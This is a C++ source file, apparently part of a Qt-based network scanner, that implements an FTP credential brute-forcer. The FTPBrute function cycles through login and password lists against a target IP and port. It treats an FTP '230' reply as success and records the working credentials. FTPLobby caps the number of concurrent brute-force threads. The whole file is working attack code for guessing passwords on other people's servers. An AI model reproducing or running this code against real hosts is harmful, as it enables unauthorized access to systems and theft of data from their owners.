#include "FTPAuth.h"
#include "FileUpdater.h"

bool FTPA::checkOutput(const string *buffer) {
    if(Utils::ustrstr(*buffer, "230") != -1) {

        return true;
    }

    return false;
}

lopaStr FTPA::FTPBrute(const char *ip, const int port, PathStr *ps) {
    string buffer;
    string lpString;
    lopaStr lps = {"UNKNOWN", "", ""};

	int res = 0;
	int passCounter = 0;
	int rowIndex = -1;

    char login[128] = {0};
    char pass[32] = {0};
	//char nip[128] = { 0 };

	for (int i = 0; i < MaxFTPLogin; ++i)
    {
        if(!globalScanFlag) return lps;
		FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready; });
		strcpy(login, ftpLoginLst[i]);
		if (strlen(login) <= 1) continue;

		for (int j = 0; j < MaxFTPPass; ++j)
        {
            if(!globalScanFlag) return lps;
			FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready; });
			strcpy(pass, ftpPassLst[j]);
			if (strlen(pass) <= 1) continue;

            lpString = string(login)
				+ string(pass);
			
			Connector con;
			res = con.nConnect(ip, port, &buffer, NULL, NULL, &lpString);
			if (res == -2) {
				if (rowIndex == -1) {
					nesca_3::addBARow(QString(ip), "--", "FAIL");
				}
				else {
					stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
				}
				return lps;
			}
			else if (res != -1) {
				if (!globalScanFlag) return lps;
                strcpy(lps.login, login);
                strcpy(lps.pass, pass);
				ps->directoryCount = std::count(buffer.begin(), buffer.end(), '\n');

				if (rowIndex == -1) {
					nesca_3::addBARow(QString(ip), QString(login) + ":" + QString(pass), "OK");
				}
				else {
					stt->doEmitionChangeBARow(rowIndex, QString(login) + ":" + QString(pass), "OK");
				}
				
				return lps;
			};

			if (BALogSwitched) {
				if (rowIndex == -1) {
					rowIndex = nesca_3::addBARow(QString(ip),
						QString(login) + ":" + QString(pass),
						QString::number((passCounter / (double)(MaxFTPPass*MaxFTPLogin)) * 100).mid(0, 4) + "%");
				}
				else {
					stt->doEmitionChangeBARow(rowIndex, QString(login) + ":" + QString(pass),
						QString::number((passCounter / (double)(MaxFTPPass*MaxFTPLogin)) * 100).mid(0, 4) + "%");
				}
			}
			else { rowIndex = -1; }
			++passCounter;
            Sleep(50);
        }
    }

	if (rowIndex == -1) {
		nesca_3::addBARow(QString(ip), "--", "FAIL");
	}
	else {
		stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
	}
    return lps;
}

lopaStr FTPA::FTPLobby(const char *ip, const int port, PathStr *ps) {
    if(gMaxBrutingThreads > 0) {
        while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

		++baCount;
		++BrutingThrds;
		stt->doEmitionUpdateArc(gTargets);
		const lopaStr &lps = FTPBrute(ip, port, ps);
		--BrutingThrds;

        return lps;
    } else {
        lopaStr lps = {"UNKNOWN", "", ""};
        return lps;
    }
}
